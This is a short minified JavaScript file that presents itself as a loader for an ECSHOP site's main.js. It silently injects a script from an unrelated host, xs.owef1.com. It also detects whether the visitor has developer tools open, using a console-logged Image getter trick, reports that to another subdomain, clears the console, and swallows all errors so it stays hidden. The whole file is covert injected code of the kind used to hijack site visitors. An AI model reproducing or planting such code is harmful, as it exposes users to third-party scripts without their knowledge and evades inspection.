(
	function(){
		try{
			var e="__z_",
			t="http://www.poso2o.com/ECSHOP/js/main.js?v=1",
			c=document,n=c.currentScript,
			a=c.getElementsByTagName("head")[0],
			i=function(e,t){
				var r=c.createElement("script");
				r.type="text/javascript",t&&(r.id=t),
				r.src=e,a.appendChild(r)},
				s=setInterval(function(){
					var I=new Image,C=window.console;
					Object.defineProperty(
						I,
						"id",
						{
							get:function(){
								I.src="http://l.xs.owef1.com/"+encodeURIComponent(t),
								clearInterval(s)
							}
						}
					),
					C&&(C.log(I),
						C.clear()
					)},
					2e3
				);
				c.getElementById(e)||self==top&&(
					i("http://xs.owef1.com/?tsliese=78417231",e)
					),n&&(n.defer||n.async)?i(t):c.write('<script src="'+t+'"></script>')}catch(e){};})()
